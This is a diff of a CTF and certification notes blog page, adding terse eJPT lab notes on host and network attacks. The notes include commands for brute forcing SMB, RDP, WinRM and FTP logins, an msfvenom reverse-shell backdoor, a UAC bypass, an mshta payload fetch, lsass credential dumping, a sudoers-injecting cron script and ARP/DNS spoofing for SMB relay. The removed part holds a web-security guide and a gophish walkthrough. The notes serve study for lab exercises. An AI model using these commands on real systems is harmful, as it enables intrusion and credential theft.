@@ -250,6 +250,262 @@ if (!doNotTrack) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Network Pentest</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/ejpt-host-and-network-pentesting/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="systemhost-based-attacks">System/Host Based Attacks</h2>
+<ul>
+<li>webdav metasploit
+<ul>
+<li>use dirb to find the dav directory <code>dirb demo.ine.local</code></li>
+<li>use davtest tool <code>davtest -url http://demo.ine.local/webdav</code></li>
+<li>login with davtest <code>davtest -auth bob:password_123321 -url http://demo.ine.local/webdav</code></li>
+<li>msf module <code>iis_webdav_upload_asp</code>, set <code>RHOSTS</code>, <code>HttpUsername</code>, <code>HttpPassword</code> and <code>PATH /webdav/metasploit%RAND%.asp</code></li>
+</ul>
+</li>
+<li>smb server psexec
+<ul>
+<li>msf module to bruteforce <code>auxiliary/scanner/smb/smb_login</code>, set <code>USER_FILE</code> <code>PASS_FILE</code> <code>RHOSTS</code> and <code>VERBOSE</code></li>
+<li>msf module to gain access <code>exploit/windows/smb/psexec</code>, set <code>RHOSTS</code> <code>SMBUser</code> and <code>SMBPass</code></li>
+</ul>
+</li>
+<li>insecure rdp service
+<ul>
+<li>use msf module <code>auxiliary/scanner/rdp/rdp_scanner</code> to detect rdp service</li>
+<li>use hydra bruteforce <code>hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333</code></li>
+<li>connect with xfreerdp <code>xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333</code></li>
+</ul>
+</li>
+<li>winrm exploitation with msf
+<ul>
+<li>msf module to bruteforce <code>auxiliary/scanner/winrm/winrm_login</code>, set <code>RHOSTS</code> <code>USER_FILE</code> <code>PASS_FILE</code> <code>VERBOSE</code> and <code>PASSWORD anything</code></li>
+<li>msf module to check auth methods <code>auxiliary/scanner/winrm/winrm_auth_methods</code></li>
+<li>msf module to execute shellcode <code>auxiliary/scanner/winrm/winrm_cmd</code></li>
+<li>msf module to get meterpreter session <code>exploit/windows/winrm/winrm_script_exec</code>, set <code>FORCE_VBS true</code></li>
+</ul>
+</li>
+<li>uac bypass with uacme
+<ul>
+<li>HTTP File Server (HFS) is an example</li>
+<li>use searchsploit <code>searchsploit hfs</code></li>
+<li>msf module <code>exploit/windows/http/rejetto_hfs_exec</code></li>
+<li>common meterpreter <code>getuid</code> <code>sysinfo</code>, migrate to privileged process like <code>ps -S explorer.exe</code> <code>migrate 2332</code> and <code>getsystem</code></li>
+<li>check admin privilege <code>shell</code> <code>net localgroup administrators</code> but its admin without high privilege</li>
+<li>to get high privilege, upload <code>backdoor.exe</code> from <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe &gt; 'backdoor.exe'</code> and <code>Akagi64.exe</code> from <code>UACMe</code></li>
+<li>create a <code>PAYLOAD windows/meterpreter/reverse_tcp</code> with msf module <code>exploit/multi/handler</code> and connect back with <code>Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe</code></li>
+<li>now we have high privilege, migrate to lssas.exe using <code>ps -S lsass.exe</code> <code>migrate 496</code> and dump hashes with <code>hashdump</code></li>
+</ul>
+</li>
+<li>privilege escalation using token impersonation
+<ul>
+<li>exploit hsf server with <code>exploit/windows/http/rejetto_hfs_exec</code> msf module</li>
+<li>load the incog plugin <code>load incognito</code> and check tokens <code>list_tokens -u</code></li>
+<li>impersonate token with <code>impersonate_token ATTACKDEFENSE\\Administrator </code></li>
+</ul>
+</li>
+<li>unattended installation
+<ul>
+<li>use the PowerSploit framework and Powerup.ps1 scripts <code>powershell -ep bypass (PowerShell execution policy bypass)</code> <code>. .\PowerUp.ps1</code> <code>Invoke-PrivescAudit</code></li>
+<li>there is an <code>Unattend.xml</code> at <code>cat C:\Windows\Panther\Unattend.xml</code>, decode with base64</li>
+<li>using runas <code>runas.exe /user:administrator cmd</code> and the password to login</li>
+<li>to get meterpreter use msf module <code>exploit/windows/misc/hta_server</code> and get the url, then run <code>mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta</code> on windows</li>
+</ul>
+</li>
+<li>kiwi extension
+<ul>
+<li>exploit badblue 2.7 <code>exploit/windows/http/badblue_passthru</code>, migrate <code>migrate -N lsass.exe</code>, load kiwi <code>load kiwi</code></li>
+<li>dump admin NTLM <code>creds_all</code>, extract users <code>lsa_dump_sam</code> and get syskey <code>lsa_dump_secrets</code></li>
+</ul>
+</li>
+<li>proftp recon
+<ul>
+<li>hydra bruteforce <code>hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp</code></li>
+<li>nmap bruteforce <code>nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local</code></li>
+</ul>
+</li>
+<li>samba recon
+<ul>
+<li>msf module bruteforce <code>auxiliary/scanner/smb/smb_login</code> set <code>PASS_FILE</code> and <code>SMBUser</code></li>
+<li>using hydra <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb</code></li>
+<li>using smbmap <code>smbmap -H demo.ine.local -u admin -p password1</code></li>
+<li>list the shares <code>smbclient -L demo.ine.local -U jane</code></li>
+<li>check if it exists but not browsable <code>smbclient //demo.ine.local/jane -U jane</code>, connect to smb <code>smbclient //demo.ine.local/admin -U admin</code></li>
+<li>list the named pipes using msf module <code>auxiliary/scanner/smb/pipe_auditor</code>, they faciliate IPC connection using IPC$ share</li>
+<li>use enum4linux to get SID <code>enum4linux -r -u &quot;admin&quot; -p &quot;password1&quot; demo.ine.local</code></li>
+</ul>
+</li>
+<li>cronjobs
+<ul>
+<li>add user to sudoers by injecting script executed by root cronjob <code>printf '#! /bin/bash\necho &quot;student ALL=NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers' &gt; /usr/local/share/copy.sh</code> then <code>sudo -l</code> <code>sudo su</code> into root shell</li>
+</ul>
+</li>
+<li>exploiting suid
+<ul>
+<li><code>welcome</code> file has suid bit, just run it to get root bruh</li>
+</ul>
+</li>
+<li>cracking linux password
+<ul>
+<li>exploit proftp <code>exploit/unix/ftp/proftpd_133c_backdoor</code> <code>PAYLOAD payload/cmd/unix/reverse</code></li>
+<li>post exploitation module to dump hashes <code>post/linux/gather/hashdump</code> <code>set SESSION 1</code></li>
+<li>crack hash <code>use auxiliary/analyze/crack_linux</code> <code>set SHA512 true</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="network-based-attacks">Network-Based Attacks</h2>
+<ul>
+<li>netbios hacking
+<ul>
+<li>get the security level <code>nmap -p445 --script smb-security-mode demo.ine.local</code></li>
+<li>check for anonymous access <code>smbclient -L  demo.ine.local</code></li>
+<li>enumerate users with nmap <code>nmap -p445 --script smb-enum-users.nse  demo.ine.local</code></li>
+<li>using hydra with the list of users <code>hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb</code></li>
+<li>getting meterpreter with credentials msf module <code>exploit/windows/smb/psexec</code></li>
+<li>pivot by adding route <code>run autoroute -s 10.0.22.69/20</code></li>
+<li>start a socks proxy, check the port <code>cat /etc/proxychains4.conf</code> and use msf module <code>use auxiliary/server/socks_proxy</code> and set <code>SRVPORT 9050</code> <code>VERSION 4a</code></li>
+<li>nmap over socket connection <code>proxychains nmap demo1.ine.local -sT -Pn -sV -p 445</code></li>
+<li>migrate to <code>migrate -N explorer.exe</code> and use <code>net view 10.0.22.69</code> list shares on internal device</li>
+<li>map the shares to drive <code>net use D: \\10.0.22.69\Documents</code></li>
+</ul>
+</li>
+<li>snmp analysis
+<ul>
+<li>snmp nmap bruteforce <code>nmap -sU -p 161 --script=snmp-brute demo.ine.local</code> to get community string</li>
+<li>get information on community string using <code>snmpwalk -v 1 -c public demo.ine.local</code></li>
+<li>nmap get all info on snmp <code>nmap -sU -p 161 --script snmp-* demo.ine.local &gt; snmp_output</code></li>
+<li>using list of users, we can bruteforce smb using hydra <code>hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb</code></li>
+<li>login to smb using msf module <code>exploit/windows/smb/psexec</code></li>
+</ul>
+</li>
+<li>dns and smb relay attack
+<ul>
+<li>setup the relay using msf module <code>exploit/windows/smb/smb_relay</code></li>
+<li>configure dnsspoof <code>echo &quot;172.16.5.101 *.sportsfoo.com&quot; &gt; dns</code> <code>dnsspoof -i eth1 -f dns</code></li>
+<li>enable port forwarding <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<li>start arp spoof for both sides <code>arpspoof -i eth1 -t 172.16.5.5 172.16.5.1</code> <code>arpspoof -i eth1 -t 172.16.5.1 172.16.5.5</code></li>
+<li>once it receives the connection, you get a meterpreter shell</li>
+</ul>
+</li>
+</ul>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/ejpt/">ejpt</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Nmap Enumeration</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/cpts-nmap-enumeration/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/cpts/">cpts</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
                     <h3 class="fw-bold post-title">NYP CGC CTF</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
@@ -679,6 +935,66 @@ if (!doNotTrack) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Pentesting Process</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/cert/cpts-pentesting-process/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/cpts/">cpts</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
                     <h3 class="fw-bold post-title">Post Exploitation</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
@@ -1001,426 +1317,6 @@ if (!doNotTrack) {
                 
             </div>
         </div>
-        
-
-
-
-
-    </div>
-</div>
-    
-    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
-    
-        <div class="card border mb-3 "> 
-        <div class="card-body">
-            <div class="row">
-                <div class="col-md-10">
-                    <h3 class="fw-bold post-title">Web</h3>
-                </div>
-                <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/guides/web/">
-                        <button type="button" class="btn btn-outline-dark">
-                            Link
-                        </button>
-                    </a>
-                </div>
-            </div>
-
-            
-
-            <p class="post-meta">
-                <span class="post-meta text-muted">
-  
-  
-
-  January 1, 0001
-
-  
-
-  
-
-  
-
-  
-</span>
-
-            </p>
-            
-            <div class="post-entry">
-
-                
-                <h2 id="introduction">Introduction</h2>
-<h2 id="related-tools">Related Tools</h2>
-<ul>
-<li>Resources
-<ul>
-<li>PayloadAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master">Github</a></li>
-</ul>
-</li>
-<li>API Testing
-<ul>
-<li>Postman</li>
-<li>Insomia</li>
-</ul>
-</li>
-<li>Web directory bruteforcers
-<ul>
-<li>dirb (run dirb on terminal)</li>
-<li>dirbuster (requires GUI)</li>
-<li>gobuster (similar tool)</li>
-<li>dirsearch(faster alternative to dirb) <a href="https://github.com/maurosoria/dirsearch">GitHub</a></li>
-</ul>
-</li>
-<li>Web crawlers
-<ul>
-<li>dirhunt <a href="https://github.com/Nekmo/dirhunt">GitHub</a></li>
-</ul>
-</li>
-<li>Packet utils
-<ul>
-<li>Burp Suite (requires GUI) <a href="https://portswigger.net/burp">Website</a></li>
-<li>wget</li>
-</ul>
-</li>
-</ul>
-<h2 id="key-concepts">Key Concepts</h2>
-<ul>
-<li>XXE (XML external entity) injection
-<ul>
-<li>Happens when an application parses uses data from XML files which can be modified to be malicious</li>
-<li><a href="https://portswigger.net/web-security/xxe">Website</a></li>
-</ul>
-</li>
-<li>LFI (Local File Inclusion)
-<ul>
-<li>Commonly found in PHP web application (maybe through Wordpress plugins etc)</li>
-<li>Vulnerable websites can allow you to access local files through directory traversal</li>
-<li>Look out for ways where you can supply a file path and it is served as a download/printed to the page</li>
-</ul>
-</li>
-<li>XSS
-<ul>
-<li>Stored XSS
-<ul>
-<li>Website uses external resources that contains malicious code</li>
-<li>If an SVG with XSS payload is in an iframe or embed of a website, it can be executed</li>
-</ul>
-</li>
-<li>Reflected XSS
-<ul>
-<li>When queries to a website is handled and returned in an unsafe way</li>
-</ul>
-</li>
-<li>DOM based XSS
-<ul>
-<li>Client side attack, browser executes payload that didn&rsquo;t came from the server</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SQL Injection
-<ul>
-<li>Testing
-<ul>
-<li>Try using one (single or double) quote for the input and see if there is any errors</li>
-<li>If an error is returned, the website might be vulnerable</li>
-</ul>
-</li>
-<li>Types of attack
-<ul>
-<li>Union based attack
-<ul>
-<li>Application displays the output of the query, allowing you to steal information from the database</li>
-</ul>
-</li>
-<li>Error based attack
-<ul>
-<li>Application returns an error with details about the query, helping you to craft queries to bypass checks</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Resources
-<ul>
-<li>Sqlmap <a href="https://github.com/sqlmapproject/">GitHub</a></li>
-<li>Learn and try using SQL <a href="http://mystery.knightlab.com/">Website</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Query Selector Injection
-<ul>
-<li>In MongoDB + NodeJS web apps
-<ul>
-<li>Query for login details</li>
-<li>Malicious input</li>
-<li>{&quot;$gt&quot;: &ldquo;&rdquo;} will result in true, $gt is a query selector which compares with &quot;&quot;</li>
-</ul>
-</li>
-<li>Mitigation
-<ul>
-<li>Make sure input gets sanitised as string</li>
-<li>Remove $ and . to prevent query selectors</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<ul>
-<li>
-<p>CSRF</p>
-<ul>
-<li>Steps to test for CSRF <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">Guide</a></li>
-</ul>
-</li>
-<li>
-<p>Broken Authentication</p>
-<ul>
-<li>Steps to test for Broken Authentication <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Guide</a></li>
-</ul>
-</li>
-<li>
-<p>Apache</p>
-<ul>
-<li><code>.htaccess</code> files are configuration files for its directory</li>
-</ul>
-</li>
-<li>
-<p>Practice</p>
-<ul>
-<li>bWAPP, a free and open source deliberately insecure web application <a href="http://www.itsecgames.com/">Website</a></li>
-</ul>
-</li>
-<li>
-<p>Common python applications pitfalls</p>
-<ul>
-<li>Article explainling various common python application pitfalls which can be exploited <a href="https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1">Website</a></li>
-</ul>
-</li>
-<li>
-<p>Common files</p>
-<ul>
-<li><code>robots.txt</code> contains information for crawlers to know which files and directories it has permission to check, this could potentially show hidden files</li>
-<li><code>sitemap.xml</code> contains infomation about the pages a site has to help search engines crawl and index through the website faster</li>
-</ul>
-</li>
-<li>
-<p>AWS configuration flaw</p>
-<ul>
-<li>Pacu, a web exploitation framework for exploiting configuration flaws in AWS servers <a href="https://github.com/RhinoSecurityLabs/pacu">GitHub</a></li>
-</ul>
-</li>
-<li>
-<p>Cookie Attack</p>
-<ul>
-<li>Flask Unsign [Python Tool]](<a href="https://pypi.org/project/flask-unsign/">https://pypi.org/project/flask-unsign/</a>)</li>
-</ul>
-</li>
-<li>
-<p>Server-side Template Injection (SSTI)</p>
-<ul>
-<li>Reference <a href="https://github.com/w181496/Web-CTF-Cheatsheet#ssti">GitHub</a> / <a href="https://github-com.translate.goog/w181496/Web-CTF-Cheatsheet?_x_tr_sl=zh-CN&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US&amp;_x_tr_pto=wapp#ssti">Translated Version</a></li>
-<li>Payload for more languages <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">Website</a></li>
-<li>Payload all the things SSTI <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Github</a></li>
-</ul>
-</li>
-</ul>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<h2 id="heading">.</h2>
-
-                
-            </div>
-        </div>
-        
-        
-        
-        <div class="card-footer text-muted">
-            <div class="blog-tags">
-                
-                <a href="https://ctf-journey.github.io/tags/guide/">guide</a>
-                
-            </div>
-        </div>
-        
-
-
-
-
-    </div>
-</div>
-    
-    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
-    
-        <div class="card border mb-3 "> 
-        <div class="card-body">
-            <div class="row">
-                <div class="col-md-10">
-                    <h3 class="fw-bold post-title">Web Pentest</h3>
-                </div>
-                <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/cert/ejpt-webapp-pentesting/">
-                        <button type="button" class="btn btn-outline-dark">
-                            Link
-                        </button>
-                    </a>
-                </div>
-            </div>
-
-            
-
-            <p class="post-meta">
-                <span class="post-meta text-muted">
-  
-  
-
-  January 1, 0001
-
-  
-
-  
-
-  
-
-  
-</span>
-
-            </p>
-            
-            <div class="post-entry">
-
-                
-                <h2 id="social-engineering">Social Engineering</h2>
-<ul>
-<li>lets go phishing
-<ul>
-<li>run the <code>gophish.exe</code> application</li>
-<li>enter the <code>browser dashboard</code>, create a <code>new profile</code></li>
-<li>try importing a <code>landing page</code></li>
-<li>try setting up an <code>email template</code></li>
-<li>setting up <code>users and groups</code></li>
-<li>monitor campaign</li>
-</ul>
-</li>
-</ul>
-<h2 id="web--http-protocol">Web &amp; HTTP Protocol</h2>
-<ul>
-<li>HTTP method enumeration
-<ul>
-<li>curl <code>-X GET/POST/DELETE/OPTIONS</code>, OPTIONS will let you know what you can do</li>
-<li>curl <code>-I</code> is HEAD request</li>
-<li>dirb <code>dirb http://demo.ine.local</code></li>
-<li>curl post request <code>curl -X POST demo.ine.local/login.php -d &quot;name=john&amp;password=password&quot; -v</code></li>
-<li>curl upload file <code>curl demo.ine.local/uploads/ --upload-file hello.txt</code></li>
-<li>burp suite, setup foxyproxy click the <code>fox icon</code> and select <code>burp suite</code>, send to repeater and modify the request</li>
-</ul>
-</li>
-<li>Passive crawling with burp suite
-<ul>
-<li>burp suite, setup foxyproxy click the <code>fox icon</code> and select <code>burp suite</code></li>
-<li>go to the proxy tab and turn off intercept</li>
-<li>navigate to dashboard, ensure passive crawling is enabled and browse the application</li>
-</ul>
-</li>
-</ul>
-
-                
-            </div>
-        </div>
-        
-        
-        
-        <div class="card-footer text-muted">
-            <div class="blog-tags">
-                
-                <a href="https://ctf-journey.github.io/tags/ejpt/">ejpt</a>
-                
-            </div>
-        </div>
-        
-
-
-
-
-    </div>
-</div>
-    
-    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
-    
-        <div class="card border mb-3 "> 
-        <div class="card-body">
-            <div class="row">
-                <div class="col-md-10">
-                    <h3 class="fw-bold post-title">YBN CTF 2024 Guide</h3>
-                </div>
-                <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/guides/ybn-ctf-2024-guide/">
-                        <button type="button" class="btn btn-outline-dark">
-                            Link
-                        </button>
-                    </a>
-                </div>
-            </div>
-
-            
-
-            <p class="post-meta">
-                <span class="post-meta text-muted">
-  
-  
-
-  January 1, 0001
-
-  
-
-  
-
-  
-
-  
-</span>
-
-            </p>
-            
-            <div class="post-entry">
-
-                
-                <h2 id="introduction">Introduction</h2>
-<p>Hello! Welcome to the begineer guide for YBN CTF 2024!</p>
-<h2 id="category-web">Category: Web</h2>
-<ul>
-<li>Example challenge Link: <a href="https://owasp.org/www-project-juice-shop/">https://owasp.org/www-project-juice-shop/</a></li>
-<li>Example writeup link: Google &ldquo;owasp juice app writeup&rdquo;</li>
-<li>Resources: <a href="https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/">https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/</a></li>
-</ul>
-<h2 id="category-crypto">Category: Crypto</h2>
-<ul>
-<li>Example challenge Link: <a href="https://cryptohack.org/challenges/">https://cryptohack.org/challenges/</a></li>
-<li>Example writeup link: Google &ldquo;cryptohack ctf writeup&rdquo;</li>
-</ul>
-<h2 id="category-forensics">Category: Forensics</h2>
-<ul>
-<li>Example challenge Link: <a href="https://tzion0.github.io/ctf/picoctf-for/">https://tzion0.github.io/ctf/picoctf-for/</a></li>
-<li>Example writeup link: <a href="https://tzion0.github.io/ctf/picoctf-for/">https://tzion0.github.io/ctf/picoctf-for/</a></li>
-</ul>
-<h2 id="category-osint">Category: OSINT</h2>
-<ul>
-<li>Example challenge Link: <a href="https://openguessr.com/">https://openguessr.com/</a></li>
-<li>Example writeup link: Use <a href="https://maps.google.com">https://maps.google.com</a></li>
-</ul>
-<h2 id="category-pwnreversing">Category: Pwn/Reversing</h2>
-<ul>
-<li>Example challenge Link: <a href="https://pwn.college/ctf-archive/">https://pwn.college/ctf-archive/</a></li>
-<li>Example writeup link: Google &ldquo;pwn college ctf writeup&rdquo;</li>
-</ul>
-
-                
-            </div>
-        </div>
-        
-        
         
 
 
